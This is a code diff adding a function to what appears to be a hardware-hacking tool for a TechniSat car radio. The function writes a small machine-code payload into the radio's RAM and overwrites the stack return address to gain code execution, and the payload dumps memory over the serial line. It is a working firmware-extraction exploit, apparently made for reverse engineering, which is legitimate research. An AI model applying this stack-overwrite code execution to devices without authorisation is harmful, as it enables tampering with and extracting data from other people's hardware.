@@ -223,6 +223,62 @@ tsat_result_t tsat_write_ram(uint16_t address, uint8_t size, uint8_t *data)
 }
 
 
+tsat_result_t tsat_rce_dump_memory(void)
+{
+    tsat_result_t tresult;
+
+    const uint8_t increment = 8;
+    for (uint32_t dump_address=0x1000; dump_address < 0x10000; dump_address += increment) {
+        uint16_t code_address = 0x01c0;
+        uint8_t code[] = {
+            0x78,                                        //        sei
+            0xa2, 0x00,                                  //        ldx #0
+            0xbd, LOW(dump_address), HIGH(dump_address), // loop:  lda dump_address,x
+            0x85, 0x18,                                  //        sta TB_RB
+            0x17, 0x19, 0xfd,                            // wait1: bbc 0,SIO1STS,wait1
+            0x57, 0x19, 0xfd,                            // wait2: bbc 2,SIO1STS,wait2
+            0xa5, 0x18,                                  //        lda TB_RB
+            0xe8,                                        //        inx
+            0xe0, increment,                             //        cpx #increment
+            0xd0, 0xee,                                  //        bne loop
+            0x58,                                        //        cli
+            0x60,                                        //        rts
+        };
+
+        uint16_t stack_address = 0x01fc;
+        uint8_t stack[] = {
+            LOW(code_address-1), HIGH(code_address-1),
+        };
+
+        // write code payload
+        tresult = tsat_write_ram(code_address, sizeof(code), code);
+        if (tresult != TSAT_SUCCESS) { break; }
+
+        // overwrite the stack
+        tresult = tsat_write_ram(stack_address, sizeof(stack), stack);
+        if (tresult != TSAT_SUCCESS) { break; }
+
+        // receive bytes sent from our payload
+        // these are sent outside the normal technisat protocol framing
+        // if code execution was not achieved, a timeout will probably occur
+        uart_puts(UART_DEBUG, "DUMP: ");
+        uart_puthex16(UART_DEBUG, dump_address);
+        uart_puts(UART_DEBUG, " ");
+        for (uint8_t i=0; i<increment; i++) {
+          uint8_t c;
+          tresult = _recv_byte(&c); // echoes byte received to uart
+          if (tresult != TSAT_SUCCESS) { break; }
+        }
+        uart_puts(UART_DEBUG, "\n");
+
+        // if the payload worked as expected, the radio should be back in a
+        // a state where it can receive another technisat protocol command.
+    }
+
+    return tresult;
+}
+
+
 tsat_result_t tsat_hello(void)
 {
     uart_puts(UART_DEBUG, "PERFORM HELLO\r\n");
